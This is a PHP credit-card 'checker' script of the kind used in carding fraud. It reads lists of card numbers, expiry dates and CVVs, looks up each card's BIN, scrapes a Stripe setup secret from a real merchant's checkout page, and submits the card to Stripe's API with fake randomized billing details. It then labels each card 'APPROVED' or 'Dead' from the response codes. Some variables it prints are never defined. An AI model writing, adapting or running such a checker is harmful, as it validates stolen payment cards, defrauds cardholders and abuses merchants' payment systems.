<?php



error_reporting(0);


set_time_limit(0);
////error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


$separador = explode("|", $lista);
$cc = trim($separador[0]);


$cctwo = substr("$cc", 0, 6);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$banco = getStr($fim, '"bank":{"name":"', '"');
$pais = getStr($fim, '"name":"', '"');
$nivel = getStr($fim, '"brand":"', '"');



function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
      return $two;
      }
      $lista = $_GET['lista'];
      $cc = multiexplode(array(":", "|", ""), $lista)[0];
      $mon = multiexplode(array(":", "|", ""), $lista)[1];
      $year = multiexplode(array(":", "|", ""), $lista)[2];
      $cvv = multiexplode(array(":", "|", ""), $lista)[3];
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
    $str = explode($end, $str[1]);
      return $str[0];
      }
function guid(){ if (function_exists('com_create_guid') === true) return trim(com_create_guid(), '{}'); $data = openssl_random_pseudo_bytes(16); $data[6] = chr(ord($data[6]) & 0x0f | 0x40); $data[8] = chr(ord($data[8]) & 0x3f | 0x80); return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4)); }

$guid = guid();
///////////
$cclast4 = substr($cc, 12, 16);
###################===[Randomizing Details Api]====######################################################

$first = str_shuffle("GuClan");
$last = str_shuffle("SAD BOY");
$first1 = str_shuffle("SADBOYGuClan1");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$phone = rand(888888888,9999999999);
$country = "US";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$zip = "32003";
$city = "Orange+Park";
}
else{
$zip = "90201";
$city = "Bell";
};
################################################################################################################

########################################REQ 1###################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://membermouse.com/');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Accept: */*';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
$ranid = trim(strip_tags(getStr($curl,'?rid=','=1">')));
//echo "ranid:-".$ranid."<hr>";

#############################################################REQ-2###################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://membermouse.com/checkout/?rid='.$ranid.'=1');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Accept: */*';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl1 = curl_exec($ch);
curl_close($ch);
//echo $curl1;
$smallseti = trim(strip_tags(getStr($curl1,'var stripeSecret = "','_secret')));
//echo "SMALLSETI:-".$smallseti."<hr>";
$longseti = trim(strip_tags(getStr($curl1,'var stripeSecret = "','";')));
//echo "LONGSETI:-".$longseti."<hr>";

#############################################REQ-3################################################################

$ch = curl_init();
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$smallseti.'/confirm');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/setup_intents/'.$smallseti.'/confirm';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
//$headers[] = 'content-length: 1049';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: " Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][email]='.$email.'&payment_method_data[billing_details][name]='.$first.'+'.$last.'&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[guid]=12a70a29-9bae-4f05-a1db-2d79b29ed2fcc52b6b&payment_method_data[muid]=4e2165e5-bcf6-4daa-91a3-a9e19cb30e39fbf8ec&payment_method_data[sid]=58f33b9b-e806-4111-8c50-37702d36f2bf65007e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F08e0cc1e0%3B+stripe-js-v3%2F08e0cc1e0&payment_method_data[time_on_page]=52459&payment_method_data[referrer]=https%3A%2F%2Fmembermouse.com%2F&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=false&key=pk_live_1B856u0w6Jq08TTuFslF214B&client_secret='.$longseti.'');
$curl2 = curl_exec($ch);
curl_close($ch);
//echo $curl2;
$result1 = trim(strip_tags(getStr($curl2,'"message": "','",')));
//echo "RESPONSE:-".$result1."";

#######################################################-RESPONSE-CODES-#####################################################################

$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';


if (strpos($result1, ' "status": "succeeded": "successful": "Thank you, your purchase of the Builder Plan was successful!"')){ 
  echo ''.$lista.' >> [✅ APPROVED! => PAYMENT SUCCESS  => '.$receipt.'] >> 🔥 Lin Technology 🔥';
    exit;
    } else if (strpos($result1, '"cvc_check": "pass"')){
      echo ''.$lista.' >> [✅ APPROVED! => CVV Match] >> 🔥 Lin Technology 🔥';
        exit;
        } else  if ((strpos($result1, 'Your card has insufficient funds.'))){
          echo '<span class="badge badge-success">#Aprovada</span>'.$lista.' >> [✅ APPROVED! => CVV Match => Insufficient Funds] '.$bin.'('.$banco.'-'.$nivel.')>> 🔥 Lin Technology 🔥';
            exit;
            } else if ((strpos($curl2, 'incorrect_cvc')) || (strpos($curl3, 'incorrect_cvc'))){
              echo '<span class="badge badge-success">#Aprovada</span>'.$lista.' >> [✅ Aprovada! CCN => [Incorrect_cvc] '.$bin.'('.$banco.'-'.$nivel.') 🔥 Lin Technology 🔥';
                exit;
                } else if ((strpos($curl, 'generic_decline')) || (strpos($curl3, 'generic_decline'))){
                  echo '<span class="badge badge-danger">💀Dead💀</span>'.$lista.' >> [DECLINED! => DECLINED] >> 🔥 Lin Technology 🔥';
                    exit;
                    } else if ((strpos($curl, 'Your card was declined.')) ||(strpos($curl2, 'Your card was declined.')) || (strpos($curl3, 'Your card was declined.'))){
                      echo '<span class="badge badge-danger">💀Dead💀</span>'.$lista.' >> [DECLINED! => DECLINED] >> 🔥 Lin Technology 🔥';
                        exit;
                        } 
                        else {
                          echo '<span class="badge badge-danger">💀Dead💀</span>'.$lista.' [DECLINED! => ['.$code.'] ['.$dcode.'] => ['.$dcode_1.'] => ['.$msg3.']] | 🔥 Lin Technology 🔥';
                            exit;
                            }
?>







